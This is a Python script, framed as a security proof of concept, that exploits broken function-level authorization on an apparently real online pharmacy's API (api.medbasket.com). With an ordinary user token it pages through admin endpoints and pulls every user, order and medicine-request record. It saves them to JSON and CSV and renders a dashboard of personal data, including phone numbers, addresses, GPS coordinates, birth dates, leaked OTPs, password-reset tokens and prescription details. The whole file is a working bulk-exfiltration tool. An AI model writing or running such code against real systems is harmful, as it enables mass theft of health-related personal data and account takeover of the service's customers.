#!/usr/bin/env python3
"""
MedBasket Security PoC — Full Data Exfiltration & Dashboard Builder

Fetches ALL data from exposed API endpoints via pagination,
saves complete datasets as JSON + CSV, and generates an HTML dashboard.

Usage:
  python3 build_dashboard.py              # Fetch everything
  python3 build_dashboard.py --dashboard-only  # Regenerate HTML from saved JSON

Output:
  data/orders.json         — All orders (~62,900)
  data/users.json          — All users (~188,000)
  data/medicine_requests.json — All medicine requests (~6,655)
  data/dashboard.json      — Dashboard stats
  data/orders.csv          — Orders in CSV
  data/users.csv           — Users in CSV
  data/medicine_requests.csv — Medicine requests in CSV
  poc_dashboard.html       — Visual dashboard (first 500 per category)
"""

import urllib.request
import urllib.error
import json
import ssl
import html
import csv
import os
import sys
import time
from datetime import datetime

API = "https://api.medbasket.com"
TOKEN = "<TOKEN_REDACTED>"
ctx = ssl.create_default_context()

BATCH_SIZE = 50  # records per API call
MAX_RETRIES = 3
RETRY_DELAY = 2  # seconds

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")

# ---------------------------------------------------------------------------
# API helpers
# ---------------------------------------------------------------------------

def fetch(path):
    """Single API request with retry logic."""
    url = API + path
    for attempt in range(MAX_RETRIES):
        try:
            req = urllib.request.Request(url)
            req.add_header("Authorization", f"Bearer {TOKEN}")
            req.add_header("Accept", "application/json")
            with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
                return json.loads(resp.read())
        except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError) as ex:
            if attempt < MAX_RETRIES - 1:
                print(f"    Retry {attempt+1}/{MAX_RETRIES} for {path}: {ex}")
                time.sleep(RETRY_DELAY * (attempt + 1))
            else:
                raise


def fetch_all(endpoint, label):
    """Paginate through an entire endpoint, return (records[], total)."""
    # First request to get total
    first = fetch(f"{endpoint}?$limit={BATCH_SIZE}&$skip=0")
    total = first.get("total", 0)
    records = first.get("data", [])

    if total == 0:
        print(f"  {label}: 0 records")
        return records, 0

    print(f"  {label}: {total:,} total — fetching all...")

    fetched = len(records)
    while fetched < total:
        pct = int(fetched / total * 100)
        print(f"\r    [{pct:3d}%] {fetched:,} / {total:,}", end="", flush=True)
        batch = fetch(f"{endpoint}?$limit={BATCH_SIZE}&$skip={fetched}")
        data = batch.get("data", [])
        if not data:
            break
        records.extend(data)
        fetched = len(records)
        # Small delay to be somewhat gentle
        time.sleep(0.1)

    print(f"\r    [100%] {len(records):,} / {total:,} — done")
    return records, total


# ---------------------------------------------------------------------------
# CSV export helpers
# ---------------------------------------------------------------------------

def flatten(obj, prefix=""):
    """Flatten a nested dict for CSV export."""
    out = {}
    if not isinstance(obj, dict):
        return {prefix: obj}
    for k, v in obj.items():
        key = f"{prefix}.{k}" if prefix else k
        if isinstance(v, dict):
            out.update(flatten(v, key))
        elif isinstance(v, list):
            out[key] = json.dumps(v)
        else:
            out[key] = v
    return out


def save_csv(records, filepath, label):
    """Save records to CSV with auto-detected columns."""
    if not records:
        print(f"  {label}: no records to save")
        return

    # Collect all keys
    all_keys = set()
    flat_records = []
    for r in records:
        flat = flatten(r)
        flat_records.append(flat)
        all_keys.update(flat.keys())

    # Sort keys, putting _id first
    keys = sorted(all_keys)
    if "_id" in keys:
        keys.remove("_id")
        keys.insert(0, "_id")

    with open(filepath, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=keys, extrasaction="ignore")
        writer.writeheader()
        for row in flat_records:
            writer.writerow(row)

    size_mb = os.path.getsize(filepath) / (1024 * 1024)
    print(f"  {label}: {filepath} ({size_mb:.1f} MB)")


# ---------------------------------------------------------------------------
# HTML dashboard builder
# ---------------------------------------------------------------------------

def e(val):
    """HTML escape"""
    if val is None:
        return ""
    return html.escape(str(val))

def s(val, fallback="\u2014"):
    """Safe string with fallback"""
    v = e(val)
    return v if v else fallback


def build_dashboard(orders, orders_total, users, users_total, meds, meds_total, dashboard):
    """Generate poc_dashboard.html with embedded data."""

    # Cap records for the HTML file to keep it manageable
    MAX_HTML_ORDERS = 500
    MAX_HTML_USERS = 500
    MAX_HTML_MEDS = 200

    html_orders = orders[:MAX_HTML_ORDERS]
    html_users = users[:MAX_HTML_USERS]
    html_meds = meds[:MAX_HTML_MEDS]

    # Dashboard stats
    rev = dashboard.get("revenueStat", {})
    ord_stat = dashboard.get("ordersStat", {})
    cust = dashboard.get("customersStat", {})
    avg = round(rev.get("currentMonth", 0) / max(ord_stat.get("currentMonth", 1), 1))

    # Revenue chart
    year_rev = dashboard.get("yearRevenueReport", [])
    max_rev = max((m.get("revenue", 0) for m in year_rev), default=1) or 1
    chart_html = ""
    for m in year_rev:
        h = max(2, int((m.get("revenue", 0) / max_rev) * 100))
        val = f"\u20B9{m['revenue']/100000:.1f}L" if m.get("revenue", 0) > 0 else ""
        chart_html += f'<div class="bar-wrapper"><div class="bar-value">{val}</div><div class="bar" style="height:{h}px"></div><div class="bar-label">{e(m.get("name",""))}</div></div>\n'

    # Order rows
    order_rows = ""
    for i, o in enumerate(html_orders):
        try:
            addr = o.get("address") or {}
            date = o.get("createdAt", "")[:10] if o.get("createdAt") else ""
            status = o.get("status", "")
            sc = "status-paid" if status == "paid" else "status-delivered" if status == "delivered" else "status-cancelled" if status == "cancelled" else "status-default"
            items = len(o.get("items", []))
            coords = f'{addr["coordinates"]["latitude"]}, {addr["coordinates"]["longitude"]}' if addr.get("coordinates") else "\u2014"
            store_name = ""
            if o.get("store"):
                store_name = o["store"].get("storeName", "")

            order_rows += f'''<tr>
<td><button class="expand-btn" onclick="toggleDetail(this,{i})">+</button></td>
<td><strong>{s(o.get("orderId"))}</strong></td>
<td>{e(date)}</td>
<td class="pii">{s(addr.get("userName"))}</td>
<td class="pii">{s(addr.get("phoneNumber"))}</td>
<td>{s(addr.get("city"))}</td>
<td>\u20B9{s(o.get("paymentAmount") or o.get("orderTotal"))}</td>
<td><span class="status {sc}">{s(status)}</span></td>
<td>{items}</td>
</tr>
<tr class="detail-row" id="detail-{i}" style="display:none"><td colspan="9"><div class="detail-grid">
<div class="detail-item"><div class="dlabel">Full Address (PII)</div><div class="dvalue pii">{s(addr.get("fullAddress") or addr.get("addressLine1"))}</div></div>
<div class="detail-item"><div class="dlabel">Postal Code</div><div class="dvalue">{s(addr.get("postalCode"))}</div></div>
<div class="detail-item"><div class="dlabel">State</div><div class="dvalue">{s(addr.get("state"))}</div></div>
<div class="detail-item"><div class="dlabel">GPS Coordinates (PII)</div><div class="dvalue coords">{e(coords)}</div></div>
<div class="detail-item"><div class="dlabel">Alt Phone (PII)</div><div class="dvalue pii">{s(addr.get("alternatePhoneNumber"))}</div></div>
<div class="detail-item"><div class="dlabel">Payment</div><div class="dvalue">{s(o.get("paymentMode"))} / {s(o.get("paymentOrderId"))}</div></div>
<div class="detail-item"><div class="dlabel">Coupon</div><div class="dvalue">{s(o.get("couponCode"), "None")}</div></div>
<div class="detail-item"><div class="dlabel">Store</div><div class="dvalue">{s(store_name)}</div></div>
<div class="detail-item"><div class="dlabel">Device</div><div class="dvalue">{s(o.get("deviceType"))}</div></div>
<div class="detail-item"><div class="dlabel">Subtotal / Tax / Delivery</div><div class="dvalue">\u20B9{o.get("subTotal",0)} / \u20B9{o.get("taxAmount",0)} / \u20B9{o.get("deliveryCharge",0)}</div></div>
<div class="detail-item"><div class="dlabel">Prescription</div><div class="dvalue">{"YES" if o.get("hasPrescription") else "No"}</div></div>
<div class="detail-item"><div class="dlabel">Delivery Mode</div><div class="dvalue">{s(o.get("deliveryMode"))}</div></div>
</div></td></tr>
'''
        except Exception as ex:
            order_rows += f'<tr><td colspan="9" style="color:#f87171">Row {i} error: {e(str(ex))}</td></tr>\n'

    # User rows
    user_rows = ""
    for u in html_users:
        try:
            has_otp = u.get("phoneOtp") and u["phoneOtp"] not in (None, "None")
            has_token = u.get("passwordResetToken") and u["passwordResetToken"] not in (None, "None")
            dob = u.get("dateOfBirth", "")[:10] if u.get("dateOfBirth") else "\u2014"
            created = u.get("createdAt", "")[:10] if u.get("createdAt") else "\u2014"
            otp_cell = f'<span style="color:#f87171;font-weight:700">{e(u["phoneOtp"])}</span>' if has_otp else '<span style="color:#334155">\u2014</span>'
            token_cell = f'<span style="color:#f87171" title="{e(u["passwordResetToken"])}">LEAKED</span>' if has_token else '<span style="color:#334155">\u2014</span>'
            user_rows += f'''<tr class="user-row">
<td style="font-family:monospace;font-size:11px;color:#64748b">{s(u.get("_id"))}</td>
<td class="pii">{s(u.get("email"))}</td>
<td class="pii">{s(u.get("phoneNumber"))}</td>
<td class="pii">{e(dob)}</td>
<td>{s(u.get("gender"))}</td>
<td>{otp_cell}</td>
<td>{token_cell}</td>
<td>{e(created)}</td>
</tr>
'''
        except Exception as ex:
            user_rows += f'<tr><td colspan="8" style="color:#f87171">Error: {e(str(ex))}</td></tr>\n'

    # Medicine rows
    med_rows = ""
    for m in html_meds:
        try:
            presc = m.get("prescriptionUrls") or (m.get("prescription", {}) or {}).get("urls") or []
            created = m.get("createdAt", "")[:10] if m.get("createdAt") else "\u2014"
            med_rows += f'''<tr>
<td style="font-family:monospace;font-size:11px;color:#64748b">{s(m.get("_id"))}</td>
<td><span class="status status-default">{s(m.get("status"))}</span></td>
<td class="pii">{f"{len(presc)} file(s) — URLs accessible" if len(presc) > 0 else chr(8212)}</td>
<td>{e(created)}</td>
</tr>
'''
        except Exception as ex:
            med_rows += f'<tr><td colspan="4" style="color:#f87171">Error: {e(str(ex))}</td></tr>\n'

    output = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MedBasket Security PoC — Full Data Exposure (Static Snapshot)</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; }}
.banner {{ background: #dc2626; color: white; padding: 12px 20px; text-align: center; font-weight: 600; font-size: 14px; position: sticky; top: 0; z-index: 100; }}
.banner span {{ background: rgba(0,0,0,0.3); padding: 2px 8px; border-radius: 4px; font-family: monospace; }}
.container {{ max-width: 1400px; margin: 0 auto; padding: 20px; }}
h1 {{ font-size: 24px; margin-bottom: 4px; }}
.subtitle {{ color: #94a3b8; font-size: 14px; margin-bottom: 24px; }}
.stats-grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; }}
.stat-card {{ background: #1e293b; border-radius: 12px; padding: 20px; border: 1px solid #334155; }}
.stat-card .label {{ color: #94a3b8; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }}
.stat-card .value {{ font-size: 28px; font-weight: 700; margin-top: 4px; }}
.stat-card .change {{ font-size: 12px; margin-top: 4px; color: #f87171; }}
.tabs {{ display: flex; gap: 8px; margin-bottom: 16px; }}
.tab {{ padding: 8px 16px; background: #1e293b; border: 1px solid #334155; border-radius: 8px; cursor: pointer; font-size: 13px; color: #94a3b8; }}
.tab:hover {{ border-color: #6366f1; color: #e2e8f0; }}
.tab.active {{ background: #6366f1; border-color: #6366f1; color: white; }}
.panel {{ background: #1e293b; border-radius: 12px; border: 1px solid #334155; overflow: hidden; }}
.panel-header {{ padding: 16px 20px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; }}
.panel-header h2 {{ font-size: 16px; }}
.total-badge {{ background: #dc2626; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; }}
table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
th {{ background: #0f172a; padding: 10px 12px; text-align: left; color: #94a3b8; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; position: sticky; top: 44px; z-index: 10; }}
td {{ padding: 10px 12px; border-bottom: 1px solid #1a2332; }}
tr:hover td {{ background: rgba(99,102,241,0.05); }}
.pii {{ color: #f87171; font-weight: 500; }}
.status {{ padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; text-transform: uppercase; }}
.status-paid {{ background: #166534; color: #4ade80; }}
.status-delivered {{ background: #1e40af; color: #60a5fa; }}
.status-cancelled {{ background: #7f1d1d; color: #fca5a5; }}
.status-default {{ background: #334155; color: #94a3b8; }}
.expand-btn {{ background: none; border: 1px solid #334155; color: #94a3b8; padding: 2px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; }}
.expand-btn:hover {{ border-color: #6366f1; color: #e2e8f0; }}
.detail-row {{ background: #0f172a; }}
.detail-row td {{ padding: 12px 20px; }}
.detail-grid {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }}
.detail-item .dlabel {{ color: #64748b; font-size: 11px; text-transform: uppercase; }}
.detail-item .dvalue {{ color: #e2e8f0; font-size: 13px; margin-top: 2px; }}
.coords {{ color: #94a3b8; font-size: 11px; font-family: monospace; }}
.evidence-note {{ background: #1c1917; border: 1px solid #78350f; border-radius: 8px; padding: 12px 16px; margin-bottom: 16px; font-size: 12px; color: #fbbf24; }}
.revenue-chart {{ display: flex; align-items: flex-end; gap: 8px; height: 120px; padding: 16px 20px; }}
.bar-wrapper {{ flex: 1; display: flex; flex-direction: column; align-items: center; gap: 4px; }}
.bar {{ width: 100%; background: #6366f1; border-radius: 4px 4px 0 0; min-height: 2px; }}
.bar-label {{ font-size: 10px; color: #64748b; }}
.bar-value {{ font-size: 10px; color: #94a3b8; }}
.user-row td {{ font-size: 12px; }}
.data-note {{ background: #172554; border: 1px solid #1e40af; border-radius: 8px; padding: 12px 16px; margin-bottom: 16px; font-size: 12px; color: #60a5fa; }}
</style>
</head>
<body>

<div class="banner">
  SECURITY ASSESSMENT PoC — CONFIDENTIAL — Data fetched LIVE from api.medbasket.com using regular user JWT (sub: <span>6000000000000000000000a1</span>) — No admin role required
</div>

<div class="container">
  <h1>MedBasket Admin Dashboard — Unauthorized Access PoC</h1>
  <p class="subtitle">Static snapshot of live production data. All fetched using a regular user JWT — no admin credentials used.</p>

  <div class="evidence-note">
    OWASP API5:2023 (Broken Function Level Authorization). Regular user JWT accesses admin endpoints: /dashboard, /super-admin-users/orders, /medicine-requests, /users. Full dataset: {users_total:,} users, {orders_total:,} orders, {meds_total:,} medicine requests — ALL extracted to JSON/CSV in data/ directory.
  </div>

  <div class="data-note">
    Complete data exported: data/orders.json ({orders_total:,}), data/users.json ({users_total:,}), data/medicine_requests.json ({meds_total:,}). Dashboard shows first {len(html_orders)} orders, {len(html_users)} users, {len(html_meds)} medicine requests for browser performance.
  </div>

  <div class="stats-grid">
    <div class="stat-card"><div class="label">Monthly Revenue</div><div class="value">\u20B9{rev.get("currentMonth",0)/100000:.1f}L</div><div class="change">{e(rev.get("difference",""))} vs last month</div></div>
    <div class="stat-card"><div class="label">Orders This Month</div><div class="value">{ord_stat.get("currentMonth",0):,}</div><div class="change">{e(ord_stat.get("difference",""))} vs last month</div></div>
    <div class="stat-card"><div class="label">Customers</div><div class="value">{cust.get("currentMonth",0):,}</div><div class="change">{e(cust.get("difference",""))} vs last month</div></div>
    <div class="stat-card"><div class="label">Avg Order Value</div><div class="value">\u20B9{avg}</div><div class="change">&nbsp;</div></div>
  </div>

  <div class="panel" style="margin-bottom: 16px;">
    <div class="panel-header"><h2>Monthly Revenue (Live)</h2></div>
    <div class="revenue-chart">{chart_html}</div>
  </div>

  <div class="tabs">
    <div class="tab active" onclick="switchTab('orders')">Orders ({len(html_orders)} of {orders_total:,})</div>
    <div class="tab" onclick="switchTab('users')">Users ({len(html_users)} of {users_total:,})</div>
    <div class="tab" onclick="switchTab('medicines')">Medicine Requests ({len(html_meds)} of {meds_total:,})</div>
  </div>

  <div class="panel" id="ordersPanel">
    <div class="panel-header">
      <h2>Orders — Showing {len(html_orders)} of {orders_total:,}</h2>
      <span class="total-badge">{orders_total:,} total orders extracted</span>
    </div>
    <div style="overflow-x:auto; max-height:80vh; overflow-y:auto;">
      <table>
        <thead><tr>
          <th></th><th>Order ID</th><th>Date</th><th>Customer (PII)</th><th>Phone (PII)</th><th>City</th><th>Amount</th><th>Status</th><th>Items</th>
        </tr></thead>
        <tbody>{order_rows}</tbody>
      </table>
    </div>
  </div>

  <div class="panel" id="usersPanel" style="display:none">
    <div class="panel-header">
      <h2>Users — Showing {len(html_users)} of {users_total:,}</h2>
      <span class="total-badge">{users_total:,} total users extracted</span>
    </div>
    <div style="overflow-x:auto; max-height:80vh; overflow-y:auto;">
      <table>
        <thead><tr>
          <th>ID</th><th>Email (PII)</th><th>Phone (PII)</th><th>DOB (PII)</th><th>Gender</th><th>OTP Leaked</th><th>Reset Token</th><th>Created</th>
        </tr></thead>
        <tbody>{user_rows}</tbody>
      </table>
    </div>
  </div>

  <div class="panel" id="medicinesPanel" style="display:none">
    <div class="panel-header">
      <h2>Medicine Requests — Showing {len(html_meds)} of {meds_total:,}</h2>
      <span class="total-badge">{meds_total:,} total records extracted</span>
    </div>
    <div style="overflow-x:auto; max-height:80vh; overflow-y:auto;">
      <table>
        <thead><tr>
          <th>ID</th><th>Status</th><th>Prescription</th><th>Created</th>
        </tr></thead>
        <tbody>{med_rows}</tbody>
      </table>
    </div>
  </div>

</div>

<script>
function toggleDetail(btn, i) {{
  var row = document.getElementById('detail-' + i);
  if (row.style.display === 'none') {{ row.style.display = 'table-row'; btn.textContent = String.fromCharCode(8722); }}
  else {{ row.style.display = 'none'; btn.textContent = '+'; }}
}}
function switchTab(tab) {{
  document.querySelectorAll('.tab').forEach(function(t){{ t.classList.remove('active'); }});
  document.querySelectorAll('.panel[id$="Panel"]').forEach(function(p){{ p.style.display = 'none'; }});
  event.target.classList.add('active');
  document.getElementById(tab + 'Panel').style.display = 'block';
}}
</script>
</body>
</html>'''

    outpath = os.path.join(BASE_DIR, "poc_dashboard.html")
    with open(outpath, "w", encoding="utf-8") as f:
        f.write(output)
    size_mb = os.path.getsize(outpath) / (1024 * 1024)
    print(f"  Dashboard: {outpath} ({size_mb:.1f} MB)")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    dashboard_only = "--dashboard-only" in sys.argv

    os.makedirs(DATA_DIR, exist_ok=True)

    start = time.time()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if dashboard_only:
        # Load from saved JSON files
        print(f"Regenerating dashboard from saved data...")
        with open(os.path.join(DATA_DIR, "dashboard.json"), "r") as f:
            dashboard = json.load(f)
        with open(os.path.join(DATA_DIR, "orders.json"), "r") as f:
            orders_wrap = json.load(f)
        with open(os.path.join(DATA_DIR, "users.json"), "r") as f:
            users_wrap = json.load(f)
        with open(os.path.join(DATA_DIR, "medicine_requests.json"), "r") as f:
            meds_wrap = json.load(f)

        orders = orders_wrap["data"]
        orders_total = orders_wrap["total"]
        users = users_wrap["data"]
        users_total = users_wrap["total"]
        meds = meds_wrap["data"]
        meds_total = meds_wrap["total"]

    else:
        print(f"=" * 60)
        print(f"MedBasket Full Data Extraction — {timestamp}")
        print(f"Target: {API}")
        print(f"=" * 60)
        print()

        # 1. Dashboard stats
        print("[1/4] Fetching dashboard stats...")
        dashboard = fetch("/dashboard")
        with open(os.path.join(DATA_DIR, "dashboard.json"), "w") as f:
            json.dump(dashboard, f, indent=2)
        print("  Saved: data/dashboard.json")
        print()

        # 2. All orders
        print("[2/4] Fetching orders...")
        orders, orders_total = fetch_all("/super-admin-users/orders", "Orders")
        with open(os.path.join(DATA_DIR, "orders.json"), "w") as f:
            json.dump({"total": orders_total, "fetched": len(orders), "timestamp": timestamp, "data": orders}, f)
        size_mb = os.path.getsize(os.path.join(DATA_DIR, "orders.json")) / (1024 * 1024)
        print(f"  Saved: data/orders.json ({size_mb:.1f} MB)")
        save_csv(orders, os.path.join(DATA_DIR, "orders.csv"), "Orders CSV")
        print()

        # 3. All users
        print("[3/4] Fetching users...")
        users, users_total = fetch_all("/users", "Users")
        with open(os.path.join(DATA_DIR, "users.json"), "w") as f:
            json.dump({"total": users_total, "fetched": len(users), "timestamp": timestamp, "data": users}, f)
        size_mb = os.path.getsize(os.path.join(DATA_DIR, "users.json")) / (1024 * 1024)
        print(f"  Saved: data/users.json ({size_mb:.1f} MB)")
        save_csv(users, os.path.join(DATA_DIR, "users.csv"), "Users CSV")
        print()

        # 4. All medicine requests
        print("[4/4] Fetching medicine requests...")
        meds, meds_total = fetch_all("/medicine-requests", "Medicine Requests")
        with open(os.path.join(DATA_DIR, "medicine_requests.json"), "w") as f:
            json.dump({"total": meds_total, "fetched": len(meds), "timestamp": timestamp, "data": meds}, f)
        size_mb = os.path.getsize(os.path.join(DATA_DIR, "medicine_requests.json")) / (1024 * 1024)
        print(f"  Saved: data/medicine_requests.json ({size_mb:.1f} MB)")
        save_csv(meds, os.path.join(DATA_DIR, "medicine_requests.csv"), "Med Requests CSV")
        print()

    # Build HTML dashboard
    print("Building HTML dashboard...")
    build_dashboard(orders, orders_total, users, users_total, meds, meds_total, dashboard)

    elapsed = time.time() - start
    print()
    print(f"{'=' * 60}")
    print(f"COMPLETE — {elapsed:.0f}s elapsed")
    print(f"  Orders:    {len(orders):>8,} / {orders_total:,}")
    print(f"  Users:     {len(users):>8,} / {users_total:,}")
    print(f"  Medicine:  {len(meds):>8,} / {meds_total:,}")
    print(f"{'=' * 60}")
    print(f"Output files in: {DATA_DIR}/")
    print(f"  orders.json / orders.csv")
    print(f"  users.json / users.csv")
    print(f"  medicine_requests.json / medicine_requests.csv")
    print(f"  dashboard.json")
    print(f"Dashboard: poc_dashboard.html")


if __name__ == "__main__":
    main()
